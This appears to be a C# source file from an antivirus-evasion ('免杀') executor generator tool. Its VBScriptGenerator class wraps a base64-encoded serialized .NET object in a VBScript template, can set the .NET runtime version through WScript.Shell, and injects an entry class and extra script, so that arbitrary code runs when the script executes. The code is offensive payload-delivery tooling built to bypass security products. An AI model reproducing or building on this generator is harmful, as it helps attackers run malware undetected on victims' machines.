using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace 掩日___免杀执行器生成工具
{
    class VBScriptGenerator : IScriptGenerator
    {
        public string ScriptName
        {
            get
            {
                return "VBScript";
            }
        }

        public bool SupportsScriptlet
        {
            get
            {
                return true;
            }
        }

        public static string GetScriptHeader(RuntimeVersion version, Boolean debug)
        {
            StringBuilder builder = new StringBuilder();

            builder.AppendLine("Sub DebugPrint(s)");
            if (debug) builder.AppendLine("    WScript.Echo s");
            builder.AppendLine("End Sub");
            builder.AppendLine();

            builder.AppendLine("Sub SetVersion");
            if (version != RuntimeVersion.None)
            {
                builder.AppendLine("Dim shell");
                builder.AppendLine("Set shell = CreateObject(\"WScript.Shell\")");
                switch (version)
                {
                    case RuntimeVersion.v2:
                        builder.AppendLine("shell.Environment(\"Process\").Item(\"COMPLUS_Version\") = \"v2.0.50727\"");
                        break;
                    case RuntimeVersion.v4:
                        builder.AppendLine("shell.Environment(\"Process\").Item(\"COMPLUS_Version\") = \"v4.0.30319\"");
                        break;
                    case RuntimeVersion.Auto:
                        builder.AppendLine(Global_Var.vb_multi_auto_version_script);
                        break;
                }
            }
            builder.AppendLine("End Sub");
            builder.AppendLine();
            return builder.ToString();
        }

        public string GenerateScript(byte[] serialized_object, string entry_class_name, string additional_script, RuntimeVersion version, bool enable_debug)
        {
            string[] lines = JScriptGenerator.BinToBase64Lines(serialized_object);

            return GetScriptHeader(version, enable_debug)
                + Global_Var.vbs_template.Replace(
                                            "%SERIALIZED%",
                                            String.Join(Environment.NewLine + "s = s & ", lines)
                                        ).Replace(
                                            "%CLASS%",
                                            entry_class_name
                                        ).Replace(
                                            "%ADDEDSCRIPT%",
                                            additional_script
                                        );
        }
    }
}
